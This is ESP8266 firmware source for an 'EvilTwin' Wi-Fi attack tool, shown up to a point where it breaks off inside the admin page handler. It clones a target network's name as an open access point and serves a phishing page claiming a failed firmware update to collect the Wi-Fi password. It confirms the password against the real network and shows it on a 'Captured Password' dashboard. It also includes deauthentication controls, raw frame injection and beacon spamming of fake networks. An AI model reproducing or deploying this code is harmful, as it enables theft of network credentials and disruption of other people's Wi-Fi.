#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <ESP8266HTTPClient.h>

extern "C" {
#include "user_interface.h"
  typedef void (*freedom_outside_cb_t)(uint8 status);
  int wifi_register_send_pkt_freedom_cb(freedom_outside_cb_t cb);
  void wifi_unregister_send_pkt_freedom_cb(void);
  int wifi_send_pkt_freedom(uint8 *buf, int len, bool sys_seq);
}

// ---------- OUI table ----------
struct OUIEntry {
  uint8_t oui[3];
  const char* vendor;
};

const OUIEntry ouiTable[] PROGMEM = {
  { {0xCC, 0x2D, 0x21}, "Tenda" },
  { {0x50, 0xC7, 0xBF}, "TP-Link" },
  { {0x84, 0x16, 0xF9}, "TP-Link" },
  { {0x40, 0xED, 0x00}, "TP-Link" },
  { {0x18, 0xA6, 0xF7}, "Netgear" },
  { {0x00, 0x1A, 0x2B}, "Netgear" },
  { {0x00, 0x24, 0x01}, "D-Link" },
  { {0x00, 0x0C, 0x43}, "Belkin" },
  { {0x00, 0x25, 0x9C}, "Asus" },
  { {0x70, 0x1A, 0x04}, "Huawei" },
  { {0xE0, 0x6A, 0x9E}, "Xiaomi" },
  { {0x24, 0xE4, 0x3A}, "Xiaomi" },
  { {0x00, 0x1F, 0x33}, "Cisco" },
  { {0x00, 0x1A, 0x70}, "Apple" },
  { {0x00, 0x1B, 0x63}, "Apple" },
  { {0x00, 0x1E, 0x52}, "Apple" },
  { {0x00, 0x1C, 0xB3}, "Apple" },
  { {0xAC, 0x29, 0x3A}, "Apple" },
  { {0x00, 0x25, 0xBC}, "Microsoft" },
  { {0x00, 0x1D, 0x60}, "Samsung" },
  { {0x00, 0x26, 0x5B}, "Samsung" },
  { {0x00, 0x27, 0x14}, "Samsung" },
  { {0x00, 0x11, 0x32}, "Sony" },
  { {0x00, 0x14, 0xA4}, "Dell" },
  { {0x00, 0x21, 0x5E}, "Intel" },
  { {0x00, 0x23, 0x32}, "Intel" },
  { {0x00, 0x1F, 0xC1}, "Realtek" },
};

const int ouiCount = sizeof(ouiTable) / sizeof(ouiTable[0]);

String getVendor(const uint8_t* bssid) {
  for (int i = 0; i < ouiCount; i++) {
    if (bssid[0] == pgm_read_byte(&ouiTable[i].oui[0]) &&
        bssid[1] == pgm_read_byte(&ouiTable[i].oui[1]) &&
        bssid[2] == pgm_read_byte(&ouiTable[i].oui[2])) {
      return String((const char*)pgm_read_ptr(&ouiTable[i].vendor));
    }
  }
  return "Unknown";
}

// ---------- Structures ----------
typedef struct
{
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
  String vendor;
}  _Network;

// ---------- Mask (fake AP) management ----------
#define MAX_MASKS 20
struct Mask {
  String ssid;
  uint8_t bssid[6];
};
Mask masks[MAX_MASKS];
int maskCount = 0;
bool beacon_spamming_active = false;

void generateBSSID(int index, uint8_t* bssid) {
  bssid[0] = 0x02;
  bssid[1] = 0x00;
  bssid[2] = 0x00;
  bssid[3] = 0x00;
  bssid[4] = 0x00;
  bssid[5] = (uint8_t)(index + 1);
}

void addMask(String ssid) {
  if (maskCount < MAX_MASKS) {
    masks[maskCount].ssid = ssid;
    generateBSSID(maskCount, masks[maskCount].bssid);
    maskCount++;
  }
}

void deleteMask(int index) {
  if (index >= 0 && index < maskCount) {
    for (int i = index; i < maskCount - 1; i++) {
      masks[i] = masks[i + 1];
    }
    maskCount--;
  }
}

void clearMasks() {
  maskCount = 0;
  beacon_spamming_active = false;
}

String randomSSID() {
  const char* words[] = {"Home", "Office", "Guest", "WiFi", "Network", "Router", "AP", "5G", "2G", "Hotspot"};
  String ssid = String(words[random(0, 10)]) + "-" + String(random(1000, 9999));
  return ssid;
}

// ---------- Beacon spamming (tested code from Spacehuhn) ----------
const uint8_t channels[] = {1, 6, 11};
const bool wpa2 = false;
const bool appendSpaces = true;

uint8_t beaconPacket[109] = {
  0x80, 0x00, 0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
  0x00, 0x00,
  0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00,
  0xe8, 0x03,
  0x31, 0x00,
  0x00, 0x20,
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
  0x01, 0x08,
  0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
  0x03, 0x01,
  0x01,
  0x30, 0x18,
  0x01, 0x00,
  0x00, 0x0f, 0xac, 0x02,
  0x02, 0x00,
  0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 0x04,
  0x01, 0x00,
  0x00, 0x0f, 0xac, 0x02,
  0x00, 0x00
};

char emptySSID[32];
uint8_t channelIndex = 0;
uint8_t wifi_channel = 1;
uint8_t macAddr[6];

uint32_t packetSize = sizeof(beaconPacket);
uint32_t packetCounter = 0;
uint32_t attackTime = 0;
uint32_t packetRateTime = 0;

void nextChannel() {
  if (sizeof(channels) > 1) {
    uint8_t ch = channels[channelIndex];
    channelIndex++;
    if (channelIndex >= sizeof(channels)) channelIndex = 0;

    if (ch != wifi_channel && ch >= 1 && ch <= 14) {
      wifi_channel = ch;
      wifi_set_channel(wifi_channel);
    }
  }
}

void randomMac() {
  for (int i = 0; i < 6; i++) {
    macAddr[i] = random(256);
  }
}

// ---------- Global variables ----------
const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

_Network _networks[16];
_Network _selectedNetwork;

void clearArray() {
  for (int i = 0; i < 16; i++) {
    _Network _network;
    _networks[i] = _network;
  }
}

String _correct = "";
String _tryPassword = "";

// Phishing page strings
#define SUBTITLE "ACCESS POINT RESCUE MODE"
#define TITLE "<warning style='text-shadow: 1px 1px black;color:yellow;font-size:7vw;'>&#9888;</warning> Firmware Update Failed"
#define BODY "Your router encountered a problem while automatically installing the latest firmware update.<br><br>To revert the old firmware and manually update later, please verify your password."

// Helper: HTML escape
String htmlEscape(String s) {
  s.replace("&", "&amp;");
  s.replace("<", "&lt;");
  s.replace(">", "&gt;");
  s.replace("\"", "&quot;");
  s.replace("'", "&#39;");
  return s;
}

String header(String t) {
  String a = String(_selectedNetwork.ssid);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
               "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
               "div { padding: 0.5em; }"
               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; font-size:7vw;}"
               "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; border-radius: 10px; }"
               "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
               "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
               "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
               "textarea { width: 100%; }"
               ;
  String h = "<!DOCTYPE html><html>"
             "<head><title><center>" + a + " :: " + t + "</center></title>"
             "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
             "<style>" + CSS + "</style>"
             "<meta charset=\"UTF-8\"></head>"
             "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
  return h;
}

String footer() {
  return "</div><div class=q><a>&#169; All rights reserved.</a></div>";
}

String index() {
  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action='/' method=post><label>WiFi password:</label>" +
         "<input type=password id='password' name='password' minlength='8'></input><input type=submit value=Update></form>" + footer();
}

void setup() {
  Serial.begin(115200);
  randomSeed(os_random());

  // Prepare empty SSID
  for (int i = 0; i < 32; i++) emptySSID[i] = ' ';

  // Adjust beacon packet length for WPA2
  if (!wpa2) {
    beaconPacket[34] = 0x21;
    packetSize -= 26;
  }

  // Generate initial random MAC
  randomMac();

  WiFi.mode(WIFI_OFF);
  wifi_set_opmode(STATION_MODE);
  wifi_set_channel(channels[0]);

  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
  // Hidden AP: channel 1, hidden = true
  WiFi.softAP(" ", "66778899", 1, false);
  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.on("/admin", handleAdmin);
  webServer.on("/restart", handleRestart);
  webServer.on("/check", handleCheck);
  webServer.on("/masks", handleMasks);
  webServer.on("/masks/add", handleMasksAdd);
  webServer.on("/masks/random", handleMasksRandom);
  webServer.on("/masks/delete", handleMasksDelete);
  webServer.on("/masks/clear", handleMasksClear);
  webServer.on("/masks/start", handleMasksStart);
  webServer.on("/masks/stop", handleMasksStop);
  webServer.onNotFound(handleIndex);
  webServer.begin();

  Serial.println("Started \\o/");
}

void performScan() {
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }
      network.ch = WiFi.channel(i);
      network.vendor = getVendor(network.bssid);
      _networks[i] = network;
    }
  }
}

bool hotspot_active = false;
bool deauthing_active = false;
bool prev_deauth = false;
bool prev_promiscuous = false;

// ---------- EvilTwin handlers ----------
void handleResult() {
  Serial.println("=== handleResult called ===");
  if (WiFi.status() != WL_CONNECTED) {
    Serial.print("WiFi.status() = ");
    Serial.println(WiFi.status());
    Serial.println("Wrong password (connection failed).");
    deauthing_active = prev_deauth;
    if (prev_promiscuous) {
      wifi_promiscuous_enable(1);
      Serial.println("Promiscuous mode re-enabled.");
    }
    Serial.print("Deauth restored to: ");
    Serial.println(deauthing_active ? "ON" : "OFF");
    webServer.send(200, "text/html; charset=UTF-8", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 4000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><center><h2><wrong style='text-shadow: 1px 1px black;color:red;font-size:60px;width:60px;height:60px'>&#8855;</wrong><br>Wrong Password</h2><p>Please, try again.</p></center></body> </html>");
  } else {
    _correct = "Network: " + _selectedNetwork.ssid + "   Password: " + _tryPassword;
    Serial.println("SUCCESS! Password captured.");
    Serial.print("SSID: ");
    Serial.println(_selectedNetwork.ssid);
    Serial.print("Password: ");
    Serial.println(_tryPassword);
    hotspot_active = false;
    dnsServer.stop();
    int n = WiFi.softAPdisconnect(true);
    Serial.println(String(n));
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
    WiFi.softAP("Rahmttollah", "66778899", 1, true); // hidden
    dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    deauthing_active = false;
    prev_deauth = false;
    prev_promiscuous = false;
    Serial.println("Deauth disabled (success).");

    // Send success page
    String successPage = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Update Successful</title>
<style>
body {
  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
  background: #f0f4f8;
  margin: 0;
  padding: 0;
  display: flex;
  justify-content: center;
  align-items: center;
  min-height: 100vh;
}
.container {
  background: white;
  border-radius: 12px;
  box-shadow: 0 8px 30px rgba(0,0,0,0.12);
  padding: 40px 30px;
  max-width: 480px;
  width: 90%;
  text-align: center;
}
.icon {
  font-size: 72px;
  color: #2ecc71;
  margin-bottom: 16px;
}
h1 {
  color: #2c3e50;
  font-weight: 600;
  margin: 0 0 8px 0;
}
.sub {
  color: #7f8c8d;
  font-size: 16px;
  margin-bottom: 24px;
}
.detail {
  background: #f8f9fa;
  border-radius: 8px;
  padding: 16px;
  margin: 16px 0;
  font-size: 14px;
  color: #2c3e50;
  text-align: left;
}
.detail span {
  font-weight: 600;
  color: #2980b9;
}
.btn {
  background: #3498db;
  color: white;
  border: none;
  padding: 12px 28px;
  border-radius: 6px;
  font-size: 16px;
  cursor: pointer;
  text-decoration: none;
  display: inline-block;
  margin-top: 12px;
}
.btn:hover {
  background: #2980b9;
}
.footer {
  margin-top: 24px;
  font-size: 12px;
  color: #bdc3c7;
}
</style>
</head>
<body>
<div class="container">
  <div class="icon">✅</div>
  <h1>Update Successful</h1>
  <p class="sub">Your router firmware has been updated.</p>
  <div class="detail">
    <strong>Network:</strong> <span>{ssid}</span><br>
    <strong>Status:</strong> <span style="color:#2ecc71;">Connected</span>
  </div>
  <p style="color:#7f8c8d; font-size:14px;">Please reconnect your WiFi to the updated network.</p>
  <a href="/admin" class="btn">Go to Dashboard</a>
  <div class="footer">Router firmware update complete &bull; v2.1.0</div>
</div>
</body>
</html>
)rawliteral";
    successPage.replace("{ssid}", htmlEscape(_selectedNetwork.ssid));
    webServer.send(200, "text/html; charset=UTF-8", successPage);
  }
}

void handleCheck() {
  if (WiFi.status() == WL_CONNECTED) {
    webServer.send(200, "text/plain", "connected");
  } else {
    webServer.send(200, "text/plain", "disconnected");
  }
}

void handleIndex() {
  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
        _selectedNetwork = _networks[i];
        Serial.print("Selected network: ");
        Serial.println(_selectedNetwork.ssid);
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
      wifi_promiscuous_enable(1);
      Serial.println("Deauth started via parameter.");
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
      wifi_promiscuous_enable(0);
      Serial.println("Deauth stopped via parameter.");
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect(true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str()); // visible (not hidden)
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
      Serial.print("EvilTwin started with SSID: ");
      Serial.println(_selectedNetwork.ssid);
      if (webServer.hasArg("deauth") && webServer.arg("deauth") == "start") {
        deauthing_active = true;
        wifi_promiscuous_enable(1);
        Serial.println("Deauth also activated.");
      }
    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect(true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP("Rahmttollah", "66778899", 1, true); // hidden
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
      Serial.println("EvilTwin stopped.");
    }
    return;
  }

  if (hotspot_active == false) {
    webServer.send(200, "text/html; charset=UTF-8", "<html><head><meta charset='UTF-8'><meta http-equiv='refresh' content='0;url=/admin'></head><body>Redirecting to admin...</body></html>");
    return;
  } else {
    if (webServer.hasArg("password")) {
      _tryPassword = webServer.arg("password");
      Serial.println("Password submitted: " + _tryPassword);
      Serial.print("Target SSID: ");
      Serial.println(_selectedNetwork.ssid);
      Serial.print("Target BSSID: ");
      Serial.println(bytesToStr(_selectedNetwork.bssid, 6));
      Serial.print("Target Channel: ");
      Serial.println(_selectedNetwork.ch);

      prev_deauth = deauthing_active;
      prev_promiscuous = (wifi_get_opmode() == STATION_MODE ? 0 : 1);
      deauthing_active = false;
      wifi_promiscuous_enable(0);
      Serial.println("Deauth and promiscuous mode completely disabled for verification.");

      delay(1000);
      WiFi.disconnect();
      Serial.println("Disconnected from any previous network.");

      // Keep AP+STA mode – DO NOT change mode
      delay(500);

      WiFi.begin(_selectedNetwork.ssid.c_str(), _tryPassword.c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
      Serial.println("WiFi.begin called (AP+STA mode).");

      // Progress page with polling for connection status
      String progressPage = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verifying...</title>
<style>
body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding: 20px; background: #f0f4f8; color: #2c3e50; }
h2 { font-size: 6vw; margin-top: 30px; font-weight: 300; }
progress { width: 80%; max-width: 400px; height: 8px; border-radius: 4px; }
progress::-webkit-progress-bar { background: #ddd; border-radius: 4px; }
progress::-webkit-progress-value { background: #3498db; border-radius: 4px; }
#status { margin-top: 16px; font-size: 14px; color: #7f8c8d; }
</style>
<script>
let startTime = Date.now();
const timeout = 15000;
let progress = 10;

function updateProgress() {
  let elapsed = Date.now() - startTime;
  let percent;
  if (elapsed < 2000) {
    percent = 10 + (elapsed / 2000) * 50;
  } else {
    percent = 60 + ((elapsed - 2000) / 13000) * 40;
  }
  percent = Math.min(100, percent);
  document.getElementById('progressBar').value = percent;
  document.getElementById('status').textContent = 'Verifying integrity, please wait... ' + Math.round(percent) + '%';
  return percent;
}

function checkStatus() {
  fetch('/check')
    .then(response => response.text())
    .then(data => {
      if (data === 'connected') {
        window.location.href = '/result';
        return;
      }
      let percent = updateProgress();
      if (percent < 100) {
        setTimeout(checkStatus, 300);
      } else {
        window.location.href = '/result';
      }
    })
    .catch(() => {
      setTimeout(checkStatus, 500);
    });
}

window.onload = function() {
  document.getElementById('progressBar').max = 100;
  checkStatus();
};
</script>
</head>
<body>
<h2>Verifying integrity, please wait...</h2>
<progress id="progressBar" value="10" max="100"></progress>
<p id="status">Verifying integrity, please wait... 10%</p>
</body>
</html>
)rawliteral";
      webServer.send(200, "text/html; charset=UTF-8", progressPage);

      // Deauth remains off during verification – will be restored in handleResult if wrong
      Serial.println("Deauth and promiscuous remain disabled until result is known.");
    } else {
      webServer.send(200, "text/html; charset=UTF-8", index());
    }
  }
}

// ---------- Admin HTML template (stored in PROGMEM) ----------
const char adminHTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>WiFi Admin Dashboard</title>
<style>
:root{
  --bg:#0a0f18;
  --panel:#111827;
  --panel2:#0f1724;
  --border:#253044;
  --text:#f5f7fb;
  --muted:#8f9bb0;
  --accent:#5b8cff;
  --accent2:#7c5cff;
  --good:#35d39a;
}
*{box-sizing:border-box}
body{
  margin:0;
  background:
    radial-gradient(circle at 15% 0%,rgba(91,140,255,.13),transparent 30%),
    radial-gradient(circle at 90% 10%,rgba(124,92,255,.10),transparent 28%),
    var(--bg);
  color:var(--text);
  font-family:Inter,system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;
}
.shell{max-width:1100px;margin:auto;padding:28px 18px 40px}
.topbar{
  display:flex;align-items:center;justify-content:space-between;gap:18px;
  padding:18px 20px;margin-bottom:22px;
  background:rgba(17,24,39,.82);border:1px solid var(--border);
  border-radius:18px;backdrop-filter:blur(14px);
}
.brand{display:flex;align-items:center;gap:13px}
.logo{
  width:44px;height:44px;border-radius:13px;
  display:grid;place-items:center;
  background:linear-gradient(135deg,var(--accent),var(--accent2));
  font-weight:800;font-size:18px;
}
.title{font-size:18px;font-weight:750}
.subtitle{font-size:12px;color:var(--muted);margin-top:3px}
.status{
  display:flex;align-items:center;gap:8px;
  color:var(--good);font-size:13px;font-weight:650;
}
.dot{width:8px;height:8px;border-radius:50%;background:var(--good);box-shadow:0 0 12px rgba(53,211,154,.65)}
.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin-bottom:22px}
.card{
  background:rgba(17,24,39,.82);border:1px solid var(--border);
  border-radius:17px;padding:18px;
}
.label{font-size:12px;color:var(--muted);margin-bottom:9px}
.value{font-size:25px;font-weight:760;letter-spacing:-.4px}
.small{font-size:12px;color:var(--muted);margin-top:5px}
.section-head{
  display:flex;justify-content:space-between;align-items:center;gap:12px;
  margin:4px 2px 12px;
}
.section-title{font-size:15px;font-weight:720}
.actions{display:flex;gap:9px;flex-wrap:wrap}
button{
  border:1px solid var(--border);background:#151e2d;color:var(--text);
  padding:9px 13px;border-radius:10px;cursor:pointer;font-weight:650;
}
button:hover{border-color:#3b4a65;background:#192438}
button:disabled{opacity:0.4;cursor:default}
.primary{background:var(--accent);border-color:var(--accent)}
.primary:hover{background:#4e7ff0}
.danger{background:#e74c3c;border-color:#e74c3c}
.danger:hover{background:#c0392b}
.table-wrap{
  overflow-x:auto;border:1px solid var(--border);border-radius:17px;
  background:rgba(17,24,39,.82);
}
table{width:100%;border-collapse:collapse;min-width:650px}
th,td{text-align:left;padding:15px 16px;border-bottom:1px solid var(--border)}
th{font-size:11px;text-transform:uppercase;letter-spacing:.08em;color:var(--muted);font-weight:700}
td{font-size:13px}
tr:last-child td{border-bottom:0}
tr{cursor:pointer;transition:background 0.15s}
tr:hover td{background:rgba(255,255,255,.05)}
tr.selected{background:rgba(91,140,255,.12);border-left:3px solid var(--accent)}
.ssid{font-weight:700}
.badge{
  display:inline-flex;align-items:center;gap:6px;
  padding:5px 9px;border-radius:999px;
  background:rgba(91,140,255,.11);color:#a9c0ff;font-size:11px;font-weight:700
}
.captured-card{
  margin-top:22px;
  background:rgba(17,24,39,.82);border:1px solid var(--border);
  border-radius:17px;padding:18px;
  display:flex;
  align-items:center;
  justify-content:space-between;
  flex-wrap:wrap;
  gap:10px;
}
.captured-left{display:flex;flex-direction:column;gap:4px}
.captured-title{font-size:14px;font-weight:700;color:var(--good)}
.captured-value{font-size:18px;word-break:break-all}
.copy-btn{
  background:transparent;
  border:1px solid var(--border);
  padding:8px 14px;
  border-radius:8px;
  cursor:pointer;
  color:var(--text);
  font-size:14px;
  display:flex;
  align-items:center;
  gap:6px;
  transition:0.2s;
}
.copy-btn:hover{background:rgba(91,140,255,.15);border-color:var(--accent)}
.copy-btn:active{transform:scale(0.95)}
.copy-btn svg{width:18px;height:18px;fill:none;stroke:currentColor;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
.copy-btn.copied{color:var(--good);border-color:var(--good)}
.footer{margin-top:16px;text-align:center;color:var(--muted);font-size:11px}
.watermark{text-align:center;margin-top:22px;font-size:13px;color:var(--muted);opacity:0.8;letter-spacing:0.5px}
.watermark span{color:var(--accent);font-weight:700}
@media(max-width:700px){
  .shell{padding:16px 12px 28px}
  .topbar{align-items:flex-start}
  .stats{grid-template-columns:1fr}
  .actions{width:100%}
  .actions button{flex:1}
}
</style>
<script>
function selectNetwork(bssid) {
  window.location.href = "/admin?ap=" + bssid;
}

function copyPassword() {
  const passwordText = document.getElementById('passwordText').innerText;
  if (!passwordText || passwordText === 'None yet') {
    alert('No password to copy!');
    return;
  }
  const match = passwordText.match(/Password:\s*(.+)$/);
  const pwd = match ? match[1] : passwordText;
  navigator.clipboard.writeText(pwd).then(() => {
    const btn = document.getElementById('copyBtn');
    btn.classList.add('copied');
    btn.innerHTML = '✅ Copied!';
    setTimeout(() => {
      btn.classList.remove('copied');
      btn.innerHTML = `<svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg> Copy`;
    }, 2000);
  }).catch(err => {
    alert('Could not copy password.');
    console.error(err);
  });
}

function restartESP() {
  if (confirm('Restart the ESP8266? All temporary data will be lost.')) {
    fetch('/restart', {method: 'POST'})
      .then(() => { alert('Restarting...'); });
  }
}
</script>
</head>
<body>
<div class="shell">

  <header class="topbar">
    <div class="brand">
      <div class="logo">W</div>
      <div>
        <div class="title">WiFi Admin Dashboard</div>
        <div class="subtitle">Network scanner interface</div>
      </div>
    </div>
    <div class="status"><span class="dot"></span> Scanner Ready</div>
  </header>

  <section class="stats">
    <div class="card">
      <div class="label">Networks Found</div>
      <div class="value" id="networkCount">{network_count}</div>
      <div class="small">Latest scan results</div>
    </div>
    <div class="card">
      <div class="label">Selected Network</div>
      <div class="value" id="selectedName">{selected_name}</div>
      <div class="small">Current selection</div>
    </div>
    <div class="card">
      <div class="label">Scanner Status</div>
      <div class="value" style="color:var(--good)">Online</div>
      <div class="small">ESP8266 interface active</div>
    </div>
  </section>

  <div class="section-head">
    <div class="section-title">Nearby Networks</div>
    <div class="actions">
      <form style="display:inline-block" method="post" action="/admin?deauth={deauth_action}">
        <button type="submit" {deauth_disabled}>{deauth_button}</button>
      </form>
      <button onclick='if("{hotspot_action}"=="start"){ if(confirm("Deauth-o start korbe?")){ location="/admin?hotspot=start&deauth=start"; } else { location="/admin?hotspot=start"; } } else { location="/admin?hotspot=stop"; }' {hotspot_disabled}>{hotspot_button}</button>
      <button onclick="location.href='/masks'" class="primary">Manage Masks</button>
      <button id="refresh" onclick="location.reload()">Refresh UI</button>
      <button onclick="restartESP()" class="danger">Restart ESP</button>
    </div>
  </div>

  <div class="table-wrap">
    <table>
      <thead>
        <tr>
          <th>SSID</th>
          <th>BSSID</th>
          <th>Vendor</th>
          <th>Channel</th>
        </tr>
      </thead>
      <tbody>
        {network_rows}
      </tbody>
    </table>
  </div>

  <div class="captured-card">
    <div class="captured-left">
      <div class="captured-title">🔑 Captured Password</div>
      <div class="captured-value" id="passwordText">{captured_password}</div>
    </div>
    <button class="copy-btn" id="copyBtn" onclick="copyPassword()">
      <svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
      Copy
    </button>
  </div>

  <div class="footer">ESP8266 • Real‑time scanner • Click on a row to select</div>
  <div class="watermark"><span>RNR Team</span> © 2026 • All rights reserved</div>
</div>
</body>
</html>
)rawliteral";

// ---------- Admin handler ----------
void handleAdmin() {
  Serial.println("=== handleAdmin called ===");

  int count = 0;
  for (int i = 0; i < 16; i++) {
    if (_networks[i].ssid != "") count++;
  }
  if (count == 0) {
    Serial.println("No networks, performing scan...");
    performScan();
    count = 0;
    for (int i = 0; i < 16; i++) {
      if (_networks[i].ssid != "") count++;
    }
    Serial.print("Scan complete, found ");
    Serial.print(count);
    Serial.println(" networks.");
  }

  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
      wifi_promiscuous_enable(1);
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
      wifi_promiscuous_enable(0);
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect(true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str()); // visible
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
      if (webServer.hasArg("deauth") && webServer.arg("deauth") == "start") {
        deauthing_active = true;
        wifi_promiscuous_enable(1);
      }
    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect(true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP("Rahmttollah", "66778899", 1, true); // hidden
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    webServer.sendHeader("Location", "/admin", true);
    webServer.send(302, "text/plain", "");
    return;
  }

  // Build HTML from PROGMEM
  String html = String(FPSTR(adminHTML));
  if (html.length() < 100) {
    Serial.println("ERROR: Admin HTML template is empty!");
    webServer.send(200, "text/html", "<h1>Admin Page</h1><p>Sorry, the page could not be loaded. Please restart the ESP.</p>");
    return;
  }

  html.replace("{network_count}", String(count));

  String selName = (_selectedNetwork.ssid != "") ? _selectedNetwork.ssid : "None";
  html.replace("{selected_name}", selName);

  String rows = "";
  String selectedBSSID = bytesToStr(_selectedNetwork.bssid, 6);
  if (count == 0) {
    rows = "<tr><td colspan='4'>No networks found</td></tr>";
  } else {
    for (int i = 0; i < 16; i++) {
      if (_networks[i].ssid == "") break;
      String bssid = bytesToStr(_networks[i].bssid, 6);
      bool isSelected = (bssid == selectedBSSID);
      String rowClass = isSelected ? "selected" : "";
      rows += "<tr class=\"" + rowClass + "\" data-bssid=\"" + bssid + "\" onclick=\"selectNetwork('" + bssid + "')\">";
      rows += "<td class=\"ssid\">" + htmlEscape(_networks[i].ssid) + "</td>";
      rows += "<td>" + bssid + "</td>";
      rows += "<td>" + _networks[i].vendor + "</td>";
      rows += "<td><span class=\"badge\">" + String(_networks[i].ch) + "</span></td>";
      rows += "</tr>";
    }
  }
  html.replace("{network_rows}", rows);

  String captured = (_correct != "") ? htmlEscape(_correct) : "None yet";
  html.replace("{captured_password}", captured);

  bool disabled = (_selectedNetwork.ssid == "");
  if (deauthing_active) {
    html.replace("{deauth_button}", "Stop deauthing");
    html.replace("{deauth_action}", "stop");
  } else {
    html.replace("{deauth_button}", "Start deauthing");
